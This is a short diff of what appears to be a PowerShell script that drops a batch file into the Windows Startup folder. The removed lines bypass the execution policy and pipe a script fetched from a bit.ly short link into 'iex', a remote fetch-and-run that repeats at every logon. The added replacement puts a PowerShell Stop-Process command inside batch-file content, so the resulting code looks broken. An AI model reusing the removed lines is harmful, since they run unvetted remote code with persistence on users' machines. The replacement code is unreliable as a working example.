@@ -26,9 +26,7 @@
 
 $batContent = @"
 echo off
-timeout /t 30
-powershell.exe -ExecutionPolicy Bypass
-irm bit.ly/kill-wallpaper | iex
+Stop-Process -Id (Get-Process wallpaper*).Id -Force -ErrorAction SilentlyContinue
 "@
 
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
